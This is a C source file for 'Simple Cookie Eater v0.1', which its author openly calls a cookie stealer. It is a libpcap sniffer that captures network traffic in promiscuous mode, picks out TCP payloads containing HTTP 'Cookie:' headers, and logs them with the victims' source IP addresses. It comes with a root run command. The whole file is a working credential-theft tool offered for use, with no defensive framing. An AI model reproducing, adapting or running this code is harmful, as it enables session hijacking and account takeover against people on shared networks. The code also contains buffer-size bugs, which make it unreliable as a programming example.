/*
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░▓██████▒░▓████░▓████░▓█▒░░░░▓█████▒░▓██████▒░░░░
░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░░█▒░░░░
░░▓█▒░░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓████▒░░▓█████▒░░░░░
░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░▓█▒░░░░
░░░▓██████▒░▓████░▓████░▓████▒░▓█████▒░▓█▒░░░▓█▒░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

Simple Cookie Eater v0.1

*what is this ?
-so this is Simple Cookie stealer
-Just Another Snifer to find cookies

*follow my example to run:
  root# gcc -o code code.c -lpcap; ./code eth0 1000 log.txt

is held by GPL
Based in tcpdump

Author: Cooler_
E-mail: c00f3r[at]gmail[dot]com
date: 02/08/2011
BugSec Security TEAM
http://code.google.com/p/bugsec/
thanks: m0nad,_mlk_,IAK,sigsegv,delfo,c0lt7r,joey,fokerbug,
zepplin,otacon,backbone,nibbles,voidpointer,muzgo,memset,novato_br
*/
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Colors Macros
#define WHITE1 "[0m"
#define GRAY "[1;30m"
#define RED "[1;31m"
#define GREEN "[1;32m"
#define BLUE "[1;34m"

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
 u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
 u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
 u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
 u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
 u_char  ip_tos;                 /* type of service */
 u_short ip_len;                 /* total length */
 u_short ip_id;                  /* identification */
 u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
 u_char  ip_ttl;                 /* time to live */
 u_char  ip_p;                   /* protocol */
 u_short ip_sum;                 /* checksum */
 struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
  u_short th_sport;               /* source port */
  u_short th_dport;               /* destination port */
  tcp_seq th_seq;                 /* sequence number */
  tcp_seq th_ack;                 /* acknowledgement number */
  u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
  u_char  th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
  u_short th_win;                 /* window */
  u_short th_sum;                 /* checksum */
  u_short th_urp;                 /* urgent pointer */
};

static char *FileName;

void
Logo()
{
 int c=0;
 char *banner[] = {
  "(COOKIE)",
  "w  c(..)o  (",
  " \\__(-)   )",
  "     /\\  (  ",
  "    / ()__) ",
  "   w  /|",
  "     | \\",
  "     m  m",
  "Cooler's Simple Cookie Eater v0.1",
 };
 while(c^8)
 {
	 puts(banner[c]),c++;
}
}
void
Usage()
{
 puts("Simple Cookie Eater v0.1\n follow the example");
 puts("./code eth0 Number_of_packets2get log.txt");
}

void
WriteFile(char *file,char *str)
{
 FILE *arq;
 
 arq=fopen(file,"a"); 
  if(!arq) 
   puts("error to write log file"); 
 fprintf(arq,"%s\n",str); 

 fclose(arq); 
}

void
TookPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
 static int count = 1;                   /* packet counter */
 const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
 const struct sniff_ip *ip;              /* The IP header */
 const struct sniff_tcp *tcp;            /* The TCP header */
 const char *payload;                    /* Packet payload */
 char *FileWord;
 int size_ip,size_tcp,size_payload;
	
 fprintf(stdout,"\nPacket number %d:\n", count);
 count++;
	
 ethernet=(struct sniff_ethernet*)(packet);
 ip=(struct sniff_ip*)(packet + SIZE_ETHERNET);
 size_ip=IP_HL(ip)*4;
 if(size_ip<20) 
 {
  fprintf(stdout,"* Invalid IP header length: %u bytes\n", size_ip);
  return;
 }

 fprintf(stdout,"From: %s\n", inet_ntoa(ip->ip_src));
 fprintf(stdout,"To: %s\n", inet_ntoa(ip->ip_dst));
		
 switch(ip->ip_p) 
 {
  case IPPROTO_TCP:
   puts("   Protocol: TCP\n");
   break;
  case IPPROTO_UDP:
   puts("   Protocol: UDP\n");
   return;
  case IPPROTO_ICMP:
   puts("   Protocol: ICMP\n");
   return;
  case IPPROTO_IP:
   puts("   Protocol: IP\n");
   return;
  default:
   puts("   Protocol: unknown\n");
   return;	
 }

 tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
 size_tcp = TH_OFF(tcp)*4;

 if (size_tcp < 20) 
 {
  fprintf(stdout,"* Invalid TCP header length: %u bytes\n", size_tcp);
  return;
 }
	
 fprintf(stdout,"Src port: %d\n", ntohs(tcp->th_sport));
 fprintf(stdout,"Dst port: %d\n", ntohs(tcp->th_dport));
	
/* define/compute tcp payload (segment) offset */
 payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);	
/* compute tcp payload (segment) size */
 size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

//string to word in file
 FileWord=malloc( sizeof(char *)*size_payload );
	
 if(size_payload^0) 
 {
  fprintf(stdout,"   Payload (%d bytes):\n", size_payload);
  fprintf(stdout,"Look Payload:\n%s\n",payload);
  if(strstr(payload,"Cookie:"))
  {
   fprintf(stdout,"\n%s ▓▓▓▓▓▓▓▓▓████████████ cookies:is:here %s \n",RED,WHITE1);
   snprintf(FileWord,sizeof(FileWord),"From: %s\nCookie: %s\n\n",inet_ntoa(ip->ip_src),payload);
   WriteFile(FileName,FileWord);
  }
 }

 free(FileWord);
}



int main(int argc, char **argv)
{
 char *dev = NULL;			
 char errbuf[PCAP_ERRBUF_SIZE];		
 char filter_exp[] = "ip";

 pcap_t *handle;				
 struct bpf_program fp;			
 bpf_u_int32 mask;			
 bpf_u_int32 net;			

 int num_packets = 0;			

 Logo();

 if(!(argc^4))
 { 
  dev = argv[1];
  num_packets= atoi(argv[2]);
  FileName=argv[3];
 }
 else if (argc > 3) 
 {
  fprintf(stderr, "error: unrecognized command-line options\n\n");
  Usage();
  exit(EXIT_FAILURE);
 }
 else {
/* find a capture device if not specified on command-line */
  dev = pcap_lookupdev(errbuf);
  if(dev == NULL) 
  {
   fprintf(stderr, "Couldn't find default device: %s\n",
   errbuf);
   exit(EXIT_FAILURE);
  }
 }
	
 /* get network number and mask associated with capture device */
 if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1) 
 {
  fprintf(stderr, "Couldn't get netmask for device %s: %s\n",dev, errbuf);
  net = 0;
  mask = 0;
 }

/* print capture info */
 fprintf(stdout,"Device: %s\n", dev);
 fprintf(stdout,"Number of packets: %d\n", num_packets);
 fprintf(stdout,"Filter expression: %s\n", filter_exp);

/* open capture device */
 handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
 if (handle == NULL) 
 {
  fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
  exit(EXIT_FAILURE);
 }

/* make sure we're capturing on an Ethernet device [2] */
 if (pcap_datalink(handle) ^ DLT_EN10MB) 
 {
  fprintf(stderr, "%s is not an Ethernet\n", dev);
  exit(EXIT_FAILURE);
 }

/* compile the filter expression */
 if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) 
 {
  fprintf(stderr, "Couldn't parse filter %s: %s\n",
  filter_exp, pcap_geterr(handle));
  exit(EXIT_FAILURE);
 }
/* apply the compiled filter */
 if (pcap_setfilter(handle, &fp) == -1) 
 {
  fprintf(stderr, "Couldn't install filter %s: %s\n",
  filter_exp, pcap_geterr(handle));
  exit(EXIT_FAILURE);
 }

/* now we can set our callback function */
 pcap_loop(handle, num_packets, TookPacket, NULL);

// free pcap
 pcap_freecode(&fp);
 pcap_close(handle);

 puts("End Look the logs file");
 puts(FileName);

return 0;
}

